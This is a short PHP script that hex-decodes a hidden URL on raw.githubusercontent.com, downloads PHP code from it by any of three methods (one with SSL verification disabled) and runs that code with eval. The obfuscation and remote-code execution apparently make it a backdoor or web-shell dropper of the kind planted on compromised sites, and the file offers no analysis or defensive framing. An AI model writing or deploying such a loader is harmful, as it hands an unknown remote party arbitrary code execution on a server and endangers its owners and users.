<?php
$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6D656D656B63696E612F6C6C6C6C2F726566732F68656164732F6D61696E2F616C692E706870';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    // Check if 'allow_url_fopen' is enabled
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    // Check if cURL is available
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = @fopen($url, 'r')) { // Suppress warnings with '@' in case fopen fails
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

// Try downloading the script using the three functions
$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Failed to download the PHP script from URL using all methods.");
}

// Evaluate the PHP script if successfully downloaded
eval('?>' . $phpScript);
?>
